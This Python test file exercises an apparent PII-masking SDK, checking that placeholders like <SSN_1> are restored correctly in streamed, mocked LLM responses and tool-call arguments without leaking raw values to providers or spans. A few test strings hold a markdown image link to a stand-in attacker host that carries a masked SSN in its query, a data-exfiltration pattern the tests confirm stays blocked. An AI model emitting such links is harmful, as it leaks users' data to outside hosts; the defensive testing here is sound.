"""Streamed answers get their placeholders restored (no API keys, no network).

A placeholder can be split across two chunks ("<SS" + "N_1>"). These tests
stream answers cut in awkward places through the real SDK stream objects
(mocked HTTP) and check that:

  * the caller gets the same text as a restore of the whole answer,
  * tool call arguments streamed in pieces come back as valid JSON with the
    real values,
  * no raw value reaches the provider or any span; the span keeps the
    placeholder version of the answer,
  * the stream object stays the SDK's own (``with``, helpers, ``isinstance``),
  * strict mode raises after the last chunk.

The framework adapters (LiteLLM, Pydantic AI, LlamaIndex, Google ADK) have
their stream tests in tests/test_integrations_frameworks.py.
"""

from __future__ import annotations

import asyncio
import contextvars
import importlib
import importlib.util
import json

import pytest
from opentelemetry.sdk.resources import Resource
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import SimpleSpanProcessor
from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter

from taintward.sdk import instrumentation as instr
from taintward.sdk import placeholders as ph
from taintward.sdk.integrations import Ward
from taintward.sdk.placeholders import PlaceholderMap, StreamRestorer

SSN = "234-12-1234"
ASK = f"my ssn is {SSN}"


def _has(mod: str) -> bool:
    return importlib.util.find_spec(mod) is not None


needs_openai = pytest.mark.skipif(not _has("openai"), reason="openai not installed")
needs_anthropic = pytest.mark.skipif(not _has("anthropic"), reason="anthropic not installed")
needs_langchain = pytest.mark.skipif(not _has("langchain_core"), reason="langchain not installed")


@pytest.fixture
def otel():
    provider = TracerProvider(resource=Resource.create({"service.name": "test"}))
    exporter = InMemorySpanExporter()
    provider.add_span_processor(SimpleSpanProcessor(exporter))
    yield provider.get_tracer("taintward"), exporter
    provider.shutdown()


@pytest.fixture
def ward(otel):
    return Ward({"lookup": "internal"}, tracer=otel[0], llm_jurisdiction="us")


def llm_spans(exporter) -> list[dict]:
    out = []
    for s in exporter.get_finished_spans():
        a = dict(s.attributes or {})
        assert SSN not in json.dumps(a, default=str), f"raw value on span {s.name}"
        if a.get("taintward.destination") == "llm":
            out.append(a)
    return out


def _map() -> PlaceholderMap:
    m = PlaceholderMap(restore_in_urls=False)
    m.placeholder_for(SSN, "US_SSN", "pii")
    m.placeholder_for('Bo "B" Lee\\Jr', "PERSON", "pii")  # a quote and a backslash
    m.placeholder_for("bob@example.com", "EMAIL_ADDRESS", "pii")
    return m


# ---------------------------------------------------------------------------
# StreamRestorer
# ---------------------------------------------------------------------------

TEXTS = [
    "Hi <PERSON_1>, SSN <SSN_1> on file; [EMAIL_1] and PERSON_1 done",
    "See ![x](https://evil.example/?d=<SSN_1>) and <SSN_1>.",
    "&lt;SSN_1&gt; then {{PERSON_1}} end [[SSN_1]] x",
    "\\<PERSON\\_1\\> and «PERSON_1» and 【SSN_1】 and (SSN_1) and <Person 1>",
    "Step 1 [Step 2] and person_1 and <PHONE_9> stay as they are",
]


@pytest.mark.parametrize("text", TEXTS)
def test_stream_gives_the_whole_text_restore_wherever_it_is_cut(text):
    m = _map()
    want = m.restore_text(text, spaced=False)
    for i in range(len(text) + 1):
        for j in range(i, len(text) + 1):
            r = StreamRestorer(m)
            got = r.push(text[:i]) + r.push(text[i:j]) + r.push(text[j:]) + r.flush()
            assert got == want, (text[:i], text[i:j], text[j:])
    r = StreamRestorer(m)
    assert "".join(r.push(c) for c in text) + r.flush() == want


def test_stream_holds_only_what_may_be_a_placeholder():
    r = StreamRestorer(_map())
    assert r.push("Your SSN is <SS") == "Your SSN is "
    assert r.holding
    assert r.push("N_1> ok") == f"{SSN} "  # "ok" may still grow into OK_1
    assert r.flush() == "ok"
    assert not r.holding


def test_json_mode_keeps_arguments_valid_json_wherever_cut():
    m = _map()
    args = '{"who":"<PERSON_1>","url":"https://e.example/?q=x","to":"<EMAIL_1>"}'
    want = {"who": 'Bo "B" Lee\\Jr', "url": "https://e.example/?q=x", "to": "bob@example.com"}
    for i in range(len(args) + 1):
        r = StreamRestorer(m, "json")
        assert json.loads(r.push(args[:i]) + r.push(args[i:]) + r.flush()) == want, i


def test_json_mode_still_blocks_a_placeholder_inside_a_link():
    m = _map()
    args = '{"note":"say \\"hi\\"","img":"![x](https://evil.example/?d=<SSN_1>)"}'
    r = StreamRestorer(m, "json")
    out = json.loads(r.push(args[:40]) + r.push(args[40:]) + r.flush())
    assert out["img"] == "![x](https://evil.example/?d=<SSN_1>)"


def test_person_1_form_is_not_restored_in_a_stream_and_reported_lost():
    m = _map()
    text = "Write to Person 1 today"
    assert m.restore_text(text) == "Write to Bo \"B\" Lee\\Jr today"  # whole answer: unambiguous
    r = StreamRestorer(m)
    assert r.push(text) + r.flush() == text
    assert m.diagnose(text, spaced=False)["lost"] == ["Person 1"]


def test_a_piece_that_starts_inside_a_word_is_not_a_bare_placeholder():
    m = _map()
    assert m.restore_text("SSN_1 ok", before="abc") == "SSN_1 ok"
    assert m.restore_text("SSN_1 ok", before="abc ") == f"{SSN} ok"


# ---------------------------------------------------------------------------
# OpenAI SDK (mocked SSE)
# ---------------------------------------------------------------------------


def _httpx(sdk: str):
    """The httpx module the SDK uses (newer SDKs ship their own fork)."""
    base = importlib.import_module(f"{sdk}._base_client")
    return getattr(base, "httpx2", None) or base.httpx


def _sse(events, named=False) -> bytes:
    out = b""
    for e in events:
        if named:
            out += b"event: " + e["type"].encode() + b"\n"
        out += b"data: " + json.dumps(e).encode() + b"\n\n"
    return out


def _chunk(delta, finish=None):
    return {"id": "c1", "object": "chat.completion.chunk", "created": 0, "model": "gpt-test",
            "choices": [{"index": 0, "delta": delta, "finish_reason": finish}]}


CHAT_PIECES = ["Your SSN <S", "SN_1> is ", "fine, ", "<SS", "N_1", "> thanks"]
CHAT_EVENTS = (
    [_chunk({"role": "assistant", "content": ""})]
    + [_chunk({"content": p}) for p in CHAT_PIECES]
    + [_chunk({"tool_calls": [{"index": 0, "id": "t1", "type": "function",
                               "function": {"name": "lookup", "arguments": ""}}]})]
    + [_chunk({"tool_calls": [{"index": 0, "function": {"arguments": a}}]})
       for a in ['{"ssn": "<SS', 'N_1>"}']]
    + [_chunk({}, "tool_calls"),
       {"id": "c1", "object": "chat.completion.chunk", "created": 0, "model": "gpt-test",
        "choices": [], "usage": {"prompt_tokens": 11, "completion_tokens": 7,
                                 "total_tokens": 18}}])
CHAT_TEXT = f"Your SSN {SSN} is fine, {SSN} thanks"


def _openai(bodies, events, *, is_async=False):
    import openai
    httpx = _httpx("openai")

    def handler(request):
        bodies.append(json.loads(request.content))
        body = _sse(events, named=request.url.path.endswith("/responses"))
        return httpx.Response(200, headers={"content-type": "text/event-stream"},
                              content=body + b"data: [DONE]\n\n")
    if is_async:
        return openai.AsyncOpenAI(api_key="test", base_url="http://fake.local/v1",
                                  http_client=httpx.AsyncClient(
                                      transport=httpx.MockTransport(handler)))
    return openai.OpenAI(api_key="test", base_url="http://fake.local/v1",
                         http_client=httpx.Client(transport=httpx.MockTransport(handler)))


def _collect_chat(stream):
    text, args = "", ""
    for c in stream:
        for ch in c.choices:
            text += ch.delta.content or ""
            for tc in ch.delta.tool_calls or []:
                args += tc.function.arguments or ""
    return text, args


@needs_openai
class TestOpenAIStreams:
    def test_chat_stream_is_restored(self, ward, otel):
        import openai
        bodies = []
        client = ward.protect_openai(_openai(bodies, CHAT_EVENTS))
        with ward.run():
            stream = client.chat.completions.create(
                model="gpt-test", stream=True, messages=[{"role": "user", "content": ASK}])
            assert isinstance(stream, openai.Stream)
            with stream:
                chunks = list(stream)
        text, args = _collect_chat(chunks)
        assert SSN not in json.dumps(bodies[0]) and "<SSN_1>" in json.dumps(bodies[0])
        assert text == CHAT_TEXT
        # the same chunks: the held "thanks" went into the finish_reason chunk
        assert len(chunks) == len(CHAT_EVENTS) and chunks[-2].choices[0].delta.content == "thanks"
        assert json.loads(args) == {"ssn": SSN}
        (a,) = llm_spans(otel[1])
        out = json.loads(a["gen_ai.output.messages"])
        assert out[0]["content"] == "Your SSN <SSN_1> is fine, <SSN_1> thanks"
        assert json.loads(out[0]["tool_calls"][0]["function"]["arguments"]) == {"ssn": "<SSN_1>"}
        assert a["gen_ai.usage.input_tokens"] == 11 and a["taintward.violation"] is True

    def test_async_chat_stream_is_restored(self, ward, otel):
        client = ward.protect_openai(_openai([], CHAT_EVENTS, is_async=True))

        async def go():
            text = ""
            with ward.run():
                stream = await client.chat.completions.create(
                    model="gpt-test", stream=True, messages=[{"role": "user", "content": ASK}])
                async for c in stream:
                    for ch in c.choices:
                        text += ch.delta.content or ""
            return text
        assert asyncio.run(go()) == CHAT_TEXT
        assert len(llm_spans(otel[1])) == 1

    def test_stream_helper_goes_through_create(self, ward, otel):
        client = ward.protect_openai(_openai([], CHAT_EVENTS))
        with ward.run():
            with client.chat.completions.stream(
                    model="gpt-test", messages=[{"role": "user", "content": ASK}]) as stream:
                for _ in stream:
                    pass
                final = stream.get_final_completion()
        msg = final.choices[0].message
        assert msg.content == CHAT_TEXT
        assert json.loads(msg.tool_calls[0].function.arguments) == {"ssn": SSN}

    def test_json_answer_stays_valid_json(self, ward, otel):
        pieces = ['{"name": "<PERS', 'ON_1>", "ssn": "<SSN_1>"}']
        events = [_chunk({"content": p}) for p in pieces] + [_chunk({}, "stop")]
        client = ward.protect_openai(_openai([], events))
        with ward.run():
            ph.current().placeholder_for('Bo "B" Lee', "PERSON", "pii")
            stream = client.chat.completions.create(
                model="gpt-test", stream=True, response_format={"type": "json_object"},
                messages=[{"role": "user", "content": ASK}])
            text, _ = _collect_chat(stream)
        assert json.loads(text) == {"name": 'Bo "B" Lee', "ssn": SSN}

    def test_held_text_comes_out_when_the_stream_has_no_finish_chunk(self, ward, otel):
        events = [_chunk({"content": p}) for p in ["Your SSN <SS", "N_1> is fine"]]
        client = ward.protect_openai(_openai([], events))
        with ward.run():
            text, _ = _collect_chat(client.chat.completions.create(
                model="gpt-test", stream=True, messages=[{"role": "user", "content": ASK}]))
        assert text == f"Your SSN {SSN} is fine"

    def test_strict_mode_raises_after_the_last_chunk(self, otel):
        events = [_chunk({"content": p}) for p in ["Ask <PHONE_", "1> now"]] + [_chunk({}, "stop")]
        ward = Ward(tracer=otel[0], placeholder_strict=True)
        client = ward.protect_openai(_openai([], events))
        got = []
        with ward.run():
            stream = client.chat.completions.create(
                model="gpt-test", stream=True, messages=[{"role": "user", "content": ASK}])
            with pytest.raises(ph.PlaceholderRestoreError):
                for c in stream:
                    got += [ch.delta.content or "" for ch in c.choices]
        assert "".join(got) == "Ask <PHONE_1> now"  # every chunk came out first
        (a,) = llm_spans(otel[1])
        assert a["taintward.placeholders.unknown"] == ("<PHONE_1>",)

    def test_closing_early_ends_the_span(self, ward, otel):
        client = ward.protect_openai(_openai([], CHAT_EVENTS))
        with ward.run():
            with client.chat.completions.create(
                    model="gpt-test", stream=True,
                    messages=[{"role": "user", "content": ASK}]) as stream:
                next(iter(stream))
        assert len(llm_spans(otel[1])) == 1

    def test_responses_stream_is_restored(self, ward, otel):
        def ev(**kw):
            return {"sequence_number": 0, **kw}

        def response(status, output):
            return {"id": "r1", "object": "response", "created_at": 0, "model": "gpt-test",
                    "status": status, "parallel_tool_calls": True, "tool_choice": "auto",
                    "tools": [], "output": output,
                    "usage": {"input_tokens": 5, "output_tokens": 7, "total_tokens": 12,
                              "input_tokens_details": {"cached_tokens": 0},
                              "output_tokens_details": {"reasoning_tokens": 0}}}
        msg = {"type": "message", "id": "m1", "role": "assistant", "status": "completed",
               "content": [{"type": "output_text", "text": "SSN <SSN_1> is ok",
                            "annotations": []}]}
        call = {"type": "function_call", "id": "f1", "call_id": "c1", "name": "lookup",
                "arguments": '{"ssn":"<SSN_1>"}', "status": "completed"}
        text_at = {"item_id": "m1", "output_index": 0, "content_index": 0}
        events = [
            ev(type="response.created", response=response("in_progress", [])),
            *[ev(type="response.output_text.delta", delta=d, logprobs=[], **text_at)
              for d in ["SSN <S", "SN_1> is", " ok"]],
            ev(type="response.output_text.done", text="SSN <SSN_1> is ok", logprobs=[],
               **text_at),
            ev(type="response.output_item.done", output_index=0, item=msg),
            *[ev(type="response.function_call_arguments.delta", item_id="f1", output_index=1,
                 delta=d) for d in ['{"ssn":"<SS', 'N_1>"}']],
            ev(type="response.function_call_arguments.done", item_id="f1", output_index=1,
               arguments='{"ssn":"<SSN_1>"}', name="lookup"),
            ev(type="response.completed", response=response("completed", [msg, call])),
        ]
        client = ward.protect_openai(_openai([], events))
        deltas, args, done = "", "", None
        with ward.run():
            for e in client.responses.create(model="gpt-test", input=ASK, stream=True):
                if e.type == "response.output_text.delta":
                    deltas += e.delta
                elif e.type == "response.function_call_arguments.delta":
                    args += e.delta
                elif e.type == "response.output_text.done":
                    done, sent_before_done = e.text, deltas
                elif e.type == "response.completed":
                    final = e.response
        assert sent_before_done == deltas == done == final.output_text == f"SSN {SSN} is ok"
        assert json.loads(args) == json.loads(final.output[1].arguments) == {"ssn": SSN}
        (a,) = llm_spans(otel[1])
        assert "SSN <SSN_1> is ok" in a["gen_ai.output.messages"]
        assert a["gen_ai.usage.output_tokens"] == 7


# ---------------------------------------------------------------------------
# Anthropic SDK (mocked SSE)
# ---------------------------------------------------------------------------

ANTHROPIC_EVENTS = [
    {"type": "message_start", "message": {
        "id": "msg", "type": "message", "role": "assistant", "model": "claude-test",
        "content": [], "stop_reason": None, "stop_sequence": None,
        "usage": {"input_tokens": 9, "output_tokens": 1}}},
    {"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}},
    *[{"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": t}}
      for t in ["Hi <S", "SN_1", "> bye"]],
    {"type": "content_block_stop", "index": 0},
    {"type": "content_block_start", "index": 1, "content_block": {
        "type": "tool_use", "id": "tu", "name": "lookup", "input": {}}},
    *[{"type": "content_block_delta", "index": 1,
       "delta": {"type": "input_json_delta", "partial_json": j}}
      for j in ['{"ssn": "<SSN', '_1>"}']],
    {"type": "content_block_stop", "index": 1},
    {"type": "message_delta", "delta": {"stop_reason": "tool_use", "stop_sequence": None},
     "usage": {"output_tokens": 12}},
    {"type": "message_stop"},
]


def _anthropic(bodies, *, is_async=False):
    import anthropic
    httpx = _httpx("anthropic")

    def handler(request):
        bodies.append(json.loads(request.content))
        return httpx.Response(200, headers={"content-type": "text/event-stream"},
                              content=_sse(ANTHROPIC_EVENTS, named=True))
    cls = anthropic.AsyncAnthropic if is_async else anthropic.Anthropic
    client_cls = httpx.AsyncClient if is_async else httpx.Client
    return cls(api_key="test", base_url="http://fake.local",
               http_client=client_cls(transport=httpx.MockTransport(handler)))


@needs_anthropic
class TestAnthropicStreams:
    def test_messages_stream_is_restored(self, ward, otel):
        bodies = []
        client = ward.protect_anthropic(_anthropic(bodies))
        text, js, stops = "", "", []
        with ward.run():
            for e in client.messages.create(model="claude-test", max_tokens=50, stream=True,
                                            messages=[{"role": "user", "content": ASK}]):
                if e.type == "content_block_delta":
                    text += getattr(e.delta, "text", None) or ""
                    js += getattr(e.delta, "partial_json", None) or ""
                elif e.type == "content_block_stop":
                    stops.append(text)
        assert SSN not in json.dumps(bodies[0])
        assert text == f"Hi {SSN} bye"
        assert stops[0] == text  # the held "bye" came out before its block stopped
        assert json.loads(js) == {"ssn": SSN}
        (a,) = llm_spans(otel[1])
        out = json.loads(a["gen_ai.output.messages"])
        assert out[0] == {"type": "text", "text": "Hi <SSN_1> bye"}
        assert a["gen_ai.usage.input_tokens"] == 9 and a["gen_ai.usage.output_tokens"] == 12

    def test_async_messages_stream_is_restored(self, ward, otel):
        client = ward.protect_anthropic(_anthropic([], is_async=True))

        async def go():
            text = ""
            with ward.run():
                stream = await client.messages.create(
                    model="claude-test", max_tokens=50, stream=True,
                    messages=[{"role": "user", "content": ASK}])
                async with stream:
                    async for e in stream:
                        if e.type == "content_block_delta":
                            text += getattr(e.delta, "text", None) or ""
            return text
        assert asyncio.run(go()) == f"Hi {SSN} bye"
        assert len(llm_spans(otel[1])) == 1


# ---------------------------------------------------------------------------
# Taint after a stream, outside a run
# ---------------------------------------------------------------------------


@needs_openai
def test_stream_outside_a_run_carries_its_taint_to_the_next_call(ward, otel):
    client = ward.protect_openai(_openai([], CHAT_EVENTS))

    def go():
        instr._LOOSE_TAINT.set(None)
        stream = client.chat.completions.create(
            model="gpt-test", stream=True, messages=[{"role": "user", "content": ASK}])
        assert instr.current_taint() is None or not instr.current_taint().is_tainted
        _collect_chat(stream)
        return instr.current_taint()
    label = contextvars.copy_context().run(go)
    assert label is not None and label.is_tainted


# ---------------------------------------------------------------------------
# LangChain
# ---------------------------------------------------------------------------


def _lc_model(pieces, sent):
    from langchain_core.language_models.chat_models import BaseChatModel
    from langchain_core.messages import AIMessage
    from langchain_core.outputs import ChatGeneration, ChatGenerationChunk, ChatResult

    class Fake(BaseChatModel):
        @property
        def _llm_type(self):
            return "fake"

        def _generate(self, messages, stop=None, run_manager=None, **kw):
            sent.append(repr(messages))
            return ChatResult(generations=[ChatGeneration(message=AIMessage("all <SSN_1>"))])

        def _stream(self, messages, stop=None, run_manager=None, **kw):
            sent.append(repr(messages))
            for p in pieces:
                yield ChatGenerationChunk(message=p)
    if pieces is None:
        Fake._stream = BaseChatModel._stream  # cannot stream: falls back to invoke
    return Fake()


def _merge(chunks):
    full = chunks[0]
    for c in chunks[1:]:
        full = full + c
    return full


@needs_langchain
class TestLangChainStreams:
    def test_stream_is_restored(self, ward, otel):
        from langchain_core.messages import AIMessageChunk
        pieces = [AIMessageChunk(content=c) for c in ["Your <SS", "N_1> is", " fine"]] + [
            AIMessageChunk(content="", tool_call_chunks=[
                {"name": "lookup", "args": '{"ssn": "<SS', "id": "t1", "index": 0}]),
            AIMessageChunk(content="", tool_call_chunks=[
                {"name": None, "args": 'N_1>"}', "id": None, "index": 0}])]
        sent = []
        model = ward.protect_langchain_model(_lc_model(pieces, sent))
        with ward.run():
            chunks = list(model.stream(ASK))
        full = _merge(chunks)
        assert all(SSN not in s for s in sent)
        assert full.content == f"Your {SSN} is fine"
        assert full.tool_calls[0]["args"] == {"ssn": SSN}
        assert chunks[-1].chunk_position == "last" and chunks[-1].content == "fine"
        (a,) = llm_spans(otel[1])
        assert "Your <SSN_1> is fine" in a["gen_ai.output.messages"]

    def test_astream_content_blocks_are_restored(self, ward, otel):
        from langchain_core.messages import AIMessageChunk
        pieces = [AIMessageChunk(content=[{"type": "text", "text": t, "index": 0}])
                  for t in ["Hi <SS", "N_1", "> there"]] + [
            AIMessageChunk(content=[{"type": "input_json_delta", "index": 1,
                                     "partial_json": j}]) for j in ['{"ssn": "<SSN', '_1>"}']]
        model = ward.protect_langchain_model(_lc_model(pieces, []))

        async def go():
            with ward.run():
                return [c async for c in model.astream(ASK)]
        full = _merge(asyncio.run(go()))
        assert full.content[0]["text"] == f"Hi {SSN} there"
        assert json.loads(full.content[1]["partial_json"]) == {"ssn": SSN}
        assert len(llm_spans(otel[1])) == 1

    def test_model_that_cannot_stream_is_restored_with_one_span(self, ward, otel):
        model = ward.protect_langchain_model(_lc_model(None, []))
        with ward.run():
            out = list(model.stream(ASK))
        assert [m.content for m in out] == [f"all {SSN}"]
        assert len(llm_spans(otel[1])) == 1
